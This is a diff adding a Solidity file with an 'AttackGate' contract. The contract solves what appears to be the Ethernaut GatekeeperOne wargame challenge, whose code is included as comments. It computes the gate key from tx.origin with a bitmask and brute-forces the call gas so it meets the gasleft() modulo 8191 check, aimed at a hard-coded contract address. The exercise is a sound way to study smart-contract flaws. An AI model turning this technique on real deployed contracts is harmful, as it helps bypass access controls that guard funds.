@@ -6,5 +6,13 @@
         "file": "src/elevator.sol"
       }
     }
+  },
+  "src/gatekeeper.sol": {
+    "__sources__": {
+      "src/gatekeeper.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IGateKeeper{\n    function enter(bytes8 _gateKey) external returns(bool);\n}\n\n// contract GatekeeperOne {\n//     address public entrant;\n\n//     modifier gateOne() {\n//         require(msg.sender != tx.origin);\n//         _;\n//     }\n\n//     modifier gateTwo() {\n//         require(gasleft() % 8191 == 0);\n//         _;\n//     }\n\n//     modifier gateThree(bytes8 _gateKey) {\n//         require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n//         require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n//         require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n//         _;\n//     }\n\n//     function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n//         entrant = tx.origin;\n//         return true;\n//     }\n// }\n\ncontract AttackGate{\n    IGateKeeper private target;\n    bytes8 private gateKey;\n    // GatekeeperOne private test_target;\n    \n    constructor(){\n        target = IGateKeeper(0xbD308Ca9759337E85E00B4694a2D1107Dc33f838);\n        // test_target = GatekeeperOne(addr);\n    }\n\n    function attack() public returns(bool){\n        gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);\n\n        for (uint256 i = 0; i < 1000; i++) {\n            (bool success, ) = address(target).call{gas: 8191 * 3 + i}(\n                abi.encodeWithSignature(\"enter(bytes8)\", gateKey)\n            );\n\n            if (success) {\n                return success;\n            }\n        }\n\n        return false;\n    }\n}",
+        "file": "src/gatekeeper.sol"
+      }
+    }
   }
 }
